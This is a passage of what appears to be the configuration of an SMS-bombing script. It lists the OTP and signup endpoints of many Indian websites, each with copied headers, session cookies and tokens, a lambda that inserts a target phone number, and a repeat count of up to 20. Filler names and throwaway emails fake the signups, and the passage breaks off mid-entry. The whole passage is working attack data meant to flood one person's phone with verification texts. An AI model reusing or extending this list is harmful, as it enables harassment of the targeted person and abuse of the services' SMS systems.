        "url": "https://www.dream11.com/auth/passwordless/init",
        "method": "POST",
        "headers": {
            "accept": "application/json, text/plain, */*",
            "accept-language": "en-GB,en-US;q=0.9,en;q=0.8",
            "content-type": "application/json",
            "cookie": "dh_user_id=17cf6211-32d3-11ef-b821-53f25fac4eef; _scid=48db139d-e4a8-4dbd-af4b-93becdc4c5d3; _scid_r=48db139d-e4a8-4dbd-af4b-93becdc4c5d3; _fbp=fb.1.1719310489582.789493345356902452; _sctr=1%7C1719298800000; __csrf=6rcny4; _dd_s=rum=2&id=e35a5e56-45d2-4dbf-8678-20bc45cbb11c&created=1719310504672&expire=1719311451078",
            "device": "pwa",
            "origin": "https://www.dream11.com",
            "priority": "u=1, i",
            "referer": "https://www.dream11.com/register?redirectTo=%2F",
            "sec-ch-ua": '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Windows"',
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-origin",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
            "x-device-identifier": "macos"
        },
        "data": lambda phone: json.dumps({"channel": "sms", "flow": "SIGNUP", "phoneNumber": phone, "templateName": "default"}),
        "count": 1
    },
{
        "url": "https://citymall.live/api/cl-user/auth/get-otp",
        "method": "POST",
        "headers": {
            "Accept": "application/json, text/plain, */*",
            "Accept-Language": "en-GB,en-US;q=0.9,en;q=0.8",
            "Connection": "keep-alive",
            "Content-Type": "application/json",
            "Cookie": "bp=lg; vxid=3a5a7d25605926fc8a9f938b4198d7f3; referral=https%253A%252F%252Fwww.google.com%252F; _ga=GA1.1.100588395.1719309875; WZRK_G=4e632d8f31c540b3aaf6c01c140a7e0e; _fbp=fb.1.1719309877848.406176085245910420; WZRK_S_4RW-KZK-995Z=%7B%22p%22%3A1%2C%22s%22%3A1719309880%2C%22t%22%3A1719309879%7D; _ga_45DD1K708L=GS1.1.1719309875.1.0.1719309885.0.0.0",
            "Origin": "https://citymall.live",
            "Referer": "https://citymall.live/",
            "Sec-Fetch-Dest": "empty",
            "Sec-Fetch-Mode": "cors",
            "Sec-Fetch-Site": "same-origin",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
            "language": "en",
            "sec-ch-ua": '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Windows"',
            "use-applinks": "true",
            "x-app-name": "WEB",
            "x-requested-with": "WEB"
        },
        "data": lambda phone: json.dumps({"phone_number": phone}),
        "count": 5
    },
{
        "url": "https://api.codfirm.in/api/customers/login/otp?medium=sms&phoneNumber={phone}&storeUrl=bellavita1.myshopify.com&email=undefined&resendingOtp=false",
        "method": "GET",
        "headers": {
            "accept": "*/*",
            "accept-language": "en-GB,en-US;q=0.9,en;q=0.8",
            "content-type": "application/json",
            "origin": "https://bellavitaorganic.com",
            "priority": "u=1, i",
            "referer": "https://bellavitaorganic.com/",
            "sec-ch-ua": '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Windows"',
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "cross-site",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
        },
        "data": None,
        "count": 10
    },
{
        "url": "https://www.oyorooms.com/api/pwa/generateotp?locale=en",
        "method": "POST",
        "headers": {
            "accept": "*/*",
            "accept-language": "en-GB,en-US;q=0.9,en;q=0.8",
            "content-type": "text/plain;charset=UTF-8",
            "cookie": "_csrf=0L9ShP2N7kBoNgROXcXgrpzO; acc=IN; X-Location=georegion%3D104%2Ccountry_code%3DIN%2Cregion_code%3DMH%2Ccity%3DMUMBAI%2Clat%3D18.98%2Clong%3D72.83%2Ctimezone%3DGMT%2B5.50%2Ccontinent%3DAS%2Cthroughput%3Dlow%2Cbw%3D1%2Casnum%3D55836%2Cnetwork_type%3Dmobile%2Clocation_id%3D0; mab=f14b44638c4c98b516a82db98baa1d6d; expd=mww2%3A1%7Cioab%3A0%7Cmhdp%3A1%7Cbcrp%3A0%7Cpwbs%3A1%7Cslin%3A1%7Chsdm%3A2%7Ccomp%3A0%7Cnrmp%3A1%7Cnhyw%3A1%7Cppsi%3A0%7Cgcer%3A0%7Crecs%3A1%7Clvhm%3A1%7Cgmbr%3A1%7Cyolo%3A1%7Crcta%3A1%7Ccbot%3A1%7Cotpv%3A1%7Cndbp%3A0%7Cmapu%3A1%7Cnclc%3A1%7Cdwsl%3A1%7Ceopt%3A1%7Cotpv%3A1%7Cwizi%3A1%7Cmorr%3A1%7Cyopb%3A1%7CTTP%3A1%7Caimw%3A1%7Chdpn%3A0%7Cweb2%3A0%7Clog2%3A0%7Clog2%3A0%7Cugce%3A0%7Cltvr%3A1%7Chwiz%3A0%7Cwizz%3A1%7Clpcp%3A1%7Cclhp%3A0%7Cprwt%3A0%7Ccbhd%3A0%7Cins2%3A3%7Cmhdc%3A1%7Clopo%3A1%7Cptax%3A1%7Ciiat%3A0%7Cpbnb%3A0%7Cror2%3A1%7Csovb%3A1%7Cqupi%3A0%7Cnbi1%3A3; appData=%7B%22userData%22%3A%7B%22isLoggedIn%22%3Afalse%7D%7D; token=dUxaRnA5NWJyWFlQYkpQNnEtemo6bzdvX01KLUNFbnRyS3hfdEgyLUE%3D; _uid=Not%20logged%20in; XSRF-TOKEN=OP9zTOUO-KF2BfPbXRH6JwwWcsE1QiHdq7eM; fingerprint2=8f2b46724e08bf3602b6c5f6745f8301; AMP_TOKEN=%24NOT_FOUND; _ga=GA1.2.185019609.1719309292; _gid=GA1.2.1636583452.1719309292; _gcl_au=1.1.1556474320.1719309295; tvc_utm_source=google; tvc_utm_medium=organic; tvc_utm_campaign=(not set); tvc_utm_key=(not set); tvc_utm_content=(not set); rsd=true; _gat=1; _ga_589V9TZFMV=GS1.1.1719309291.1.1.1719309411.8.0.1086743157",
            "deviceid": "8f2b46724e08bf3602b6c5f6745f8301411649",
            "externalheaders": "[object Object]",
            "loc": "153",
            "origin": "https://www.oyorooms.com",
            "priority": "u=1, i",
            "referer": "https://www.oyorooms.com/login?country=&retUrl=/search%3Flocation%3DGonda%252C%2520Uttar%2520Pradesh%252C%2520India%26latitude%3D27.0374187%26longitude%3D81.95348149999995%26searchType%3Dlocality%26coupon%3D%26checkin%3D25%252F06%252F2024%26checkout%3D26%252F06%252F2024%26roomConfig%255B%255D%3D1%26showSearchElements%3Dfalse%26country%3Dindia%26guests%3D1%26rooms%3D1",
            "sdata": "eyJrdWQiOlsxODc0MDAsNTA3MDAsOTA3MDAsODMzMDAsNTkxMDAsNjg4MDAsMTE4MDAwLDg2NDAwLDExOTgwMCwxMjg2MDAsMTE0NDAwLDE5NTAwMCw4MTUwMCwxMTE4MDAsMTU5MzAwLDE0MjYwMCwxNDA5MDAsNzI1NDQ3MDAsNzI3Njg4MDAsNzMwMDgxMDAsNzMxOTI1MDAsNzMzODQzMDAsNzM2MDAxMDAsNzM4MDg1MDAsNzM5Njg0MDAsNzQxNzY3MDAsNzQ0MzIzMDAsNzkwMjQ0MDAsMjAwMDAwLDExOTkwMCw0Nzk5MDAsODE1OTAwLDEwMjQwMDAsMTQzOTcwMCwyMTk5NzAwLDI1NzU3MDAsMTE0NDAwLDI1NjIzMDAsMzUyMjEwMCwxODM3MDAsMTc1NTAwLDE1OTEwMCwxOTg5MDAsMTUxNzAwLDE1MTkwMCwxNTkyMDAsMTE5NzAwLDExOTMwMF0sImFjYyI6W10sImd5ciI6W10sInR1ZCI6W10sInRpZCI6W10sImtpZCI6Wzk5MTMxMDAsNDEyODAwLDE4MDMwMCwxNzM4MDAsODA0MDAsMTA3OTAwLDcyNzUyMDAsNzE4MDAsMTc2MDAwLDIzMjMwMCwxNjMwMCw2MzMwMDAsMjc1MDYwMCwxODQ1MDAsMjI0NzAwLDI1MDEwMCwyMzMwMCw4MDAzMDAsMjMyMjAwLDMwMzc3MDAsMTYwMDUwMCw2NDcwMCw4MDAsMjMyNDAwLDMwNDgwMCw0ODMwMCw0ODcwMCwzMjQwMCw1NTI2MDBdLCJ0bXYiOltdfQ==",
            "sec-ch-ua": '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Windows"',
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-origin",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
            "xsrf-token": "OP9zTOUO-KF2BfPbXRH6JwwWcsE1QiHdq7eM"
        },
        "data": lambda phone: json.dumps({"phone": phone, "country_code": "+91", "nod": 4}),
        "count": 2
    },
{
        "url": "https://portal.myma.in/custom-api/auth/generateotp",
        "method": "POST",
        "headers": {
            "accept": "application/json, text/plain, */*",
            "accept-language": "en-GB,en-US;q=0.9,en;q=0.8",
            "content-type": "application/json",
            "origin": "https://app.myma.in",
            "priority": "u=1, i",
            "referer": "https://app.myma.in/",
            "sec-ch-ua": '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Windows"',
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-site",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
        },
        "data": lambda phone: json.dumps({"countrycode": "+91", "mobile": f"91{phone}", "is_otpgenerated": False, "app_version": "-1"}),
        "count": 6
    },
{
        "url": "https://api.jobhai.com/auth/jobseeker/v3/send_otp",
        "method": "POST",
        "headers": {
            "accept": "application/json, text/plain, */*",
            "accept-language": "en-GB,en-US;q=0.9,en;q=0.8",
            "content-type": "application/json;charset=UTF-8",
            "device-id": "e97edd71-16a3-4835-8aab-c67cf5e21be1",
            "language": "en",
            "origin": "https://www.jobhai.com",
            "priority": "u=1, i",
            "referer": "https://www.jobhai.com/",
            "sec-ch-ua": '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Windows"',
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-site",
            "source": "WEB",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
            "x-transaction-id": "JS-WEB-cb71a96e-c335-4947-a379-bf6ee24f9a3d"
        },
        "data": lambda phone: json.dumps({"phone": phone}),
        "count": 6
    },
{
        "url": "https://api.freedo.rentals/customer/sendOtpForSignUp",
        "method": "POST",
        "headers": {
            "accept": "*/*",
            "accept-language": "en-GB,en-US;q=0.9,en;q=0.8",
            "content-type": "application/json",
            "origin": "https://freedo.rentals",
            "platform": "web",
            "priority": "u=1, i",
            "referer": "https://freedo.rentals/",
            "requestfrom": "customer",
            "sec-ch-ua": '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Windows"',
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-site",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
            "x-bn": "2.0.16",
            "x-channel": "WEB",
            "x-client-id": "FREEDO",
            "x-platform": "CUSTOMER"
        },
        "data": lambda phone: json.dumps({"email_id": "cokiwav528@avastu.com", "first_name": "Haiii", "mobile_number": phone}),
        "count": 6
    },
{
        "url": "https://www.licious.in/api/login/signup",
        "method": "POST",
        "headers": {
            "accept": "*/*",
            "accept-language": "en-GB,en-US;q=0.9,en;q=0.8",
            "content-type": "application/json",
            "cookie": "source=website; _gid=GA1.2.1957294880.1719308075; WZRK_G=fd462bffc0674ad3bdf9f6b7c537c6c7; _gat=1; _gcl_au=1.1.1898387226.1719308076; ajs_anonymous_id=f59e4a4c-db21-44c5-b067-2c942debda44; location=eyJjaXBoZXJ0ZXh0IjoidWp4RnBDeXpKZU1UVHV2THJnbjZSNHZlRWRXTXRmQWhaUlJYakZJVlFFRHV1a3FkQnBwT2hTOEVwc1h4Q1ltTUJKSXozUWMxRHZUYnIvTE1LNU52VG1IVytBTEc0ZDR5dktnZ1B6MjRBWUxQK0ZzRGxScmJMTXo3MU85bDJXdStISDhuQmdYRkZ5eEdteU44VVBqbDFlTzV5dEQvY1NSQTZ1MitORzhIajZKZXJma093QjJ1a2tVeEJrYWtIQWRmaHE3d0E4Sm41cWtCQmNYNUZxUUk0S1RYVjZudHBXYTBPcEViVHkxMmVuNEZjUXAyb2ZzU2M4eTkvWTlvWnV4UFNFZ0x6M0tTMXlmc0ZBN25MUWZ6RG0rbkt1SE5sMVpLMDFkU0VXaHVPMmQxUlFZemJ3NzF4QWsveWNUSDBwS2JoaitUaEZJY1M0NFZLWmsrK3A4K0VSU2pqNDJ2RG5RZU05NVUrYVEzOFI2UUR4RWRDV3hubVdoL3oyRWg0ZFJyIiwiaXYiOiI1YzlmNjlmMGNmOGY3ZjgwMWU3ZTEzZWRkNzQ5MDVmNiIsInNhbHQiOiJjZGMzYTZkNTI5Nzc3MWJmN2UzODE1NDI1ZmQ1YzYwZWM2MDU2N2U0ZmRhMzQ5ODg1OTQxYTM0MTFhODBjNDgyOTdhZTA1M2Q1ZjcxOWJkMWQ0OTk0OGEwYTU0ZjYzYjE0YmQ0NDc5NTAyZWZjZWFlOGQyMDM3MDQ3NzM3NmI4NTQxOWVhYmJlZDc1YWVlMTY2NjE1NzM3MzRhYTUxOWJmY2ExZGIxYzQ2MmU1NzBmNzQ1NDIwM2JhZWFjYmNmOGQ5MTQ3OThjNDEwNjllYWJhM2ViY2Q5Y2E4OTUwMDJmOTQ2YTIyYjllZjE4ZGJkZWZjZTg0YTU0OGU3MWFkMTEwZDc4MmZjNDVhYjYxYzg4ZWY1ZmRkODM3NGE1ZTkxODg2N2NjZDc3ODA0MmQzYjUzMmFjMzVkMTVmYjU0NzQ3NmY1Njg0NjJmNmE2Y2I2MTQ2NjZjODU1ZThjOWI0ZWMyZGVlOTlmMTdiZDkxZjMwMDI1NGMyMTNjOGUzNTY4YTEyNjFhZGY4ZTYxMGZmYmIxZmZiODgzMDQ5OGIxNGMyYzk5NDI4ODY1MmYzZjcxOTExOWFiZTRjODQyZTk4MjAxNDlmOWJiZDU4ZTgzMmYyYWI3OTQzZWY3YThjYjc1NDFjZjIxZGUxM2FkOTQ0ZGRkZjdjOTk1MTlmYTk4ZGE0MiIsIml0ZXJhdGlvbnMiOjk5OX0=; _ga_YN0TX18PEE=GS1.1.1719308076.1.1.1719308104.0.0.0; _ga=GA1.1.2028763947.1719308075; nxt=eyJjaXBoZXJ0ZXh0IjoiUXB4VkE1a2swL0FQQzB4SytuUzdiSVNaUDJkOS8rNDNEb2orQktNTVdhST0iLCJpdiI6Ijk1NTBiZDY1NzYwYjYxNGU1MDZkZTEzZjk5ODFlZThkIiwic2FsdCI6ImVjYzQ0MTNjZTllOGJhNTA3OTJjYzhmZTMyZjc0NTQ1MzI5NTNhNmY5Mjg1NWU4MmMzMzA0MWZiODc1ZmQzNTIyZjcyMjllZTViNTRmY2Y5YTVjYzJlYThkMDFlNGJhOTA0NDA5OGYxMjVhMDIxYTUzYzY3ZDA2N2I0MjJhNDAwM2U3NGUxOGVlYTIzZGE5YTUyNmQyOTgzYTU5NTQ0MjlhMTRiOTAzZDJjY2RlNTIyNmI3ZmI3MjdjZmVkMTJkZGQ4OTgzMWQ4MTJjYWMxMTRhMjI1MmEwMjFjOWYxYTM2NzFhOTVkZmUxNjNhNjI4ZjYxYzg3MWI4ZWQzZTUzN2NjOGM1YTNlNjQzNDdlYjY5MzQ0MWU2YWZjYTkyODlkMTcxOGQ2ODI5ZTJkN2Y1MjhhNzQzNjY4OGRmMjFmZGJiNWEwYWM5NTYyODMyNTQ4NzJhOThmOWEyODA2ZDhjZmVmNWNkOTA2MmE0NDc3YjY0ODk3ZGQ1Y2RlNjEyZWFhOTdmMGI1MDEwNDE2MjRkNzUyNDg5NDIyYmE0MmQwMzFjZGI2NWU1NjA5NTQ3ZjA2ZGQ0MDVmNjZjM2VmYjIzZWFjOTk1MTM4MTEzZGE5ZTFkNjFkYWFmZDJlMDJlOWZkMGEzNDVmMDNiNjFhNzU5OTlmYTM3NmZjZjIwMTIwOTUwIiwiaXRlcmF0aW9ucyI6OTk5fQ==; WZRK_S_445-488-5W5Z=%7B%22p%22%3A3%2C%22s%22%3A1719308078%2C%22t%22%3A1719308110%7D",
            "origin": "https://www.licious.in",
            "priority": "u=1, i",
            "referer": "https://www.licious.in/",
            "sec-ch-ua": '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Windows"',
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-origin",
            "serverside": "false",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
            "x-csrf-token": ""
        },
        "data": lambda phone: json.dumps({"phone": phone, "captcha_token": None}),
        "count": 3
    },
{
        "url": "https://prod.api.cosmofeed.com/api/user/authenticate",
        "method": "POST",
        "headers": {
            "accept": "application/json, text/plain, */*",
            "accept-language": "en-GB,en-US;q=0.9,en;q=0.8",
            "content-type": "application/json",
            "cosmofeed-request-id": "fe247a51-c977-4882-a9b8-fe303692ddc3",
            "origin": "https://superprofile.bio",
            "priority": "u=1, i",
            "referer": "https://superprofile.bio/",
            "sec-ch-ua": '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Windows"',
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "cross-site",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
        },
        "data": lambda phone: json.dumps({"phoneNumber": phone, "countryCode": "+91", "data": {"email": "abcd2@gmail.com"}, "authScreen": "signup-screen", "userIsConvertingToCreator": False}),
        "count": 1
    },
{
        "url": "https://apis.bisleri.com/send-otp",
        "method": "POST",
        "headers": {
            "accept": "*/*",
            "accept-language": "en-GB,en-US;q=0.9,en;q=0.8",
            "content-type": "application/json",
            "origin": "https://www.bisleri.com",
            "priority": "u=1, i",
            "referer": "https://www.bisleri.com/",
            "sec-ch-ua": '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Windows"',
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-site",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
            "x-requested-with": "7Yhm6b86qTsrpcMWtUixPLnv02nHf3wFf5vkukwu"
        },
        "data": lambda phone: json.dumps({"email": "abfhhfhcd@gmail.com", "mobile": phone}),
        "count": 20
    },
{
        "url": "https://www.evitalrx.in:4000/v3/login/signup_sendotp",
        "method": "POST",
        "headers": {
            "sec-ch-ua": '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
            "Accept": "application/json, text/plain, */*",
            "Content-Type": "application/json",
            "Referer": "https://pharmacy.evitalrx.in/",
            "sec-ch-ua-mobile": "?0",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
            "sec-ch-ua-platform": '"Windows"'
        },
        "data": lambda phone: json.dumps({"pharmacy_name": "hfhfjfgfhkf", "mobile": phone, "referral_code": "", "email_id": "jhvd@gmail.com", "zip_code": "110086", "device_id": "f2cea99f-381d-432d-bd27-02bc6678fa93", "app_version": "desktop", "device_name": "Chrome", "device_model": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36", "device_manufacture": "Windows", "device_release": "windows-10", "device_sdk_version": "126.0.0.0"}),
        "count": 3
    },
{
        "url": "https://pwa.getquickride.com/rideMgmt/probableuser/create/new",
        "method": "POST",
        "headers": {
            "APP-TOKEN": "s16-q9fz-jy3p-rk",
            "Accept": "application/json, text/plain, */*",
            "Accept-Language": "en-GB,en-US;q=0.9,en;q=0.8",
            "Authorization": "Bearer eyJhbGciOiJIUzUxMiJ9.eyJzdWIiOiIwIiwiaXNzIjoiUXVpY2tSaWRlIiwiaWF0IjoxNTI2ODg2NzU1fQ.nsy3UbPnaANf7d3O0xAW3LTG1P-dgcEhgqwOey-IK2kFCGxr298jfLKkE2k6taTvzETpJMPpertJu3uzJDtDUQ",
            "Connection": "keep-alive",
            "Content-Type": "application/x-www-form-urlencoded",
            "Cookie": "_ga_S6LZW9RD9Z=GS1.1.1719144863.1.0.1719144863.0.0.0; _ga=GA1.2.2033204632.1719144864; _gid=GA1.2.502724273.1719144864; _gat_gtag_UA_139055405_3=1; _gat_UA-139055405-3=1",
            "Origin": "https://pwa.getquickride.com",
            "Referer": "https://pwa.getquickride.com/",
            "Sec-Fetch-Dest": "empty",
            "Sec-Fetch-Mode": "cors",
            "Sec-Fetch-Site": "same-origin",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
            "sec-ch-ua": '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Windows"'
        },
        "data": lambda phone: f"contactNo={phone}&countryCode=%2B91&appName=Quick%20Ride&payload=&signature=&signatureAlgo=&domainName=pwa.getquickride.com",
        "count": 5
    },
{
        "url": "https://www.clovia.com/api/v4/signup/check-existing-user/?phone={phone}&isSignUp=true&email=&is_otp=True&token",
        "method": "GET",
        "headers": {
            "accept": "application/json, text/plain, */*",
            "accept-language": "en-GB,en-US;q=0.9,en;q=0.8",
            "cookie": 'comp_par="utm_campaign=70553\054firstclicktime=2024-06-23 17:18:10.351125\054utm_medium=ppc\054http_referer=https://www.google.com/\054utm_source=10001"; cr_id_last=None; last_source_time="2024-06-23 17:18:10.351039"; last_source=10001; nur=None; sessionid=2kp1dzotrgpe698bfanq4tp4qechv2ln; data_in_visits="10001&2024-06-23 17:18:10.350961\054"; csrftoken=UrmVVY4g3YmpffRV3Rdznqrq2kBLItpN; utm_campaign_last=70553; __cf_bm=HdXzeqlgG6io1sY6qie2eVJ74XMfXuLRNJIs.oTzbho-1719143290-1.0.1.1-Op8tdLoYJnUoaXpFfk927ZZafyzjr3qZ5z2ejJCkf8HmQTPzaaGR.erei72oVEdSsJx_1XTH1zQNpmsn9zLAig; _cfuvid=T_lLlwC6IEneinYAELiGdaxZlBaqKOZ8upanwvhyZiE-1719143290370-0.0.1.1-604800000; fw_utm={%22value%22:%22{%5C%22utm_source%5C%22:%5C%2210001%5C%22%2C%5C%22utm_medium%5C%22:%5C%22ppc%5C%22%2C%5C%22utm_campaign%5C%22:%5C%2270553%5C%22}%22%2C%22createTime%22:%222024-06-23T11:48:13.312Z%22}; fw_uid={%22value%22:%2292f5a144-b31b-4b24-96c6-d894804e5039%22%2C%22createTime%22:%222024-06-23T11:48:13.337Z%22}; fw_se={%22value%22:%22fws2.c48f4a93-0256-4df1-ae3f-2d33f47d61d6.1.1719143293468%22%2C%22createTime%22:%222024-06-23T11:48:13.468Z%22}; G_ENABLED_IDPS=google; _gid=GA1.2.767062449.1719143297; _gac_UA-62869587-1=1.1719143297.EAIaIQobChMI683g3dPxhgMVWBmtBh1SkwpREAAYAiAAEgKP5PD_BwE; _gcl_au=1.1.385881254.1719143298; _gcl_gs=2.1.k1$i1719143288; _gac_UA-62869587-2=1.1719143298.EAIaIQobChMI683g3dPxhgMVWBmtBh1SkwpREAAYAiAAEgKP5PD_BwE; _fbp=fb.1.1719143298995.264854070543037114; _ga_MF23YQ1Y0R=GS1.2.1719143300.1.0.1719143300.60.0.0; _ga=GA1.1.991595777.1719143297; _gcl_aw=GCL.1719143303.EAIaIQobChMI683g3dPxhgMVWBmtBh1SkwpREAAYAiAAEgKP5PD_BwE; _ga_TC6QEKJ4BS=GS1.1.1719143302.1.0.1719143302.60.0.0; _ga_ZMCTPTF5ZP=GS1.2.1719143304.1.0.1719143304.60.0.0; _clck=ggl1zg%7C2%7Cfmv%7C0%7C1635; _clsk=1iq7ave%7C1719143306731%7C1%7C1%7Cr.clarity.ms%2Fcollect; moe_uuid=b79017f8-6aad-4af9-b387-8dfef3749d3f',
            "priority": "u=1, i",
            "referer": "https://www.clovia.com/?utm_source=10001&utm_medium=ppc&utm_term=clovia_brand&utm_campaign=70553&gad_source=1&gclid=EAIaIQobChMI683g3dPxhgMVWBmtBh1SkwpREAAYAiAAEgKP5PD_BwE",
            "sec-ch-ua": '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Windows"',
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-origin",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
        },
        "data": None,
        "count": 5
    },
{
        "url": "https://admin.kwikfixauto.in/api/auth/signupotp/",
        "method": "POST",
        "headers": {
            "accept": "application/json",
            "accept-language": "en-GB,en-US;q=0.9,en;q=0.8",
            "content-type": "application/json",
            "origin": "https://kwikfixauto.in",
            "priority": "u=1, i",
            "referer": "https://kwikfixauto.in/",
            "sec-ch-ua": '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Windows"',
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-site",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
        },
        "data": lambda phone: json.dumps({"phone": phone}),
        "count": 3
    },
{
        "url": "https://www.brevistay.com/cst/app-api/login",
        "method": "POST",
        "headers": {
            "accept": "application/json, text/plain, */*",
            "accept-language": "en-GB,en-US;q=0.9,en;q=0.8",
            "authorization": "Bearer null",
            "brevi-channel": "DESKTOP_WEB",
            "brevi-channel-version": "40.0.0",
            "content-type": "application/json",
            "cookie": "WZRK_G=e35f2d1372894c078327721b0dce1643; PHPSESSID=t012m1s7ml0b1hrrt0clq063a0; _gcl_au=1.1.450954870.1719050061; _gid=GA1.2.2009705537.1719050079; _gat_UA-76491234-1=1; _ga_WRZEGYZRTW=GS1.1.1719050079.1.0.1719050079.0.0.1234332753; WZRK_S_R9Z-654-466Z=%7B%22p%22%3A2%2C%22s%22%3A1719050070%2C%22t%22%3A1719050079%7D; _clck=jleo6d%7C2%7Cfmu%7C0%7C1634; FPID=FPID2.2.as0IAmsiCa%2FP1407PbQfVL1Cc6nZ8u9zt2atD67UFIg%3D.1719050076; FPGSID=1.1719050080.1719050080.G-WRZEGYZRTW.SFwCEJeloGt9Yand3iX5MA; _fbp=fb.1.1719050080798.755777096366214429; FPLC=SlslklfyB3CaJY%2FHqIBvl5T3%2BI4dZHhl0NlWIJSwxvEmGnCsD4K%2Fechm2wpS0K3EgQCtOmHpqIBDQYTq5BsZTmC%2BDvjIVHjpREcazaWVfqimPEXJb5W63br788Qq2g%3D%3D; _clsk=1r9n9qk%7C1719050081944%7C1%7C1%7Cq.clarity.ms%2Fcollect; _ga=GA1.2.1921624223.1719050076; _ga_B5ZBCV939N=GS1.1.1719050079.1.0.1719050085.54.0.0",
            "origin": "https://www.brevistay.com",
            "priority": "u=1, i",
            "referer": "https://www.brevistay.com/login?red=/hotels-in-lucknow",
            "sec-ch-ua": '"Google Chrome";v="125", "Chromium";v="125", "Not.A/Brand";v="24"',
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Windows"',
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-origin",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36"
        },
        "data": lambda phone: json.dumps({"is_otp": 1, "is_password": 0, "mobile": phone}),
        "count": 15
    },
{
        "url": "https://web-api.hourlyrooms.co.in/api/signup/sendphoneotp",
        "method": "POST",
        "headers": {
            "Accept": "*/*",
            "Accept-Language": "en-GB,en-US;q=0.9,en;q=0.8",
            "Connection": "keep-alive",
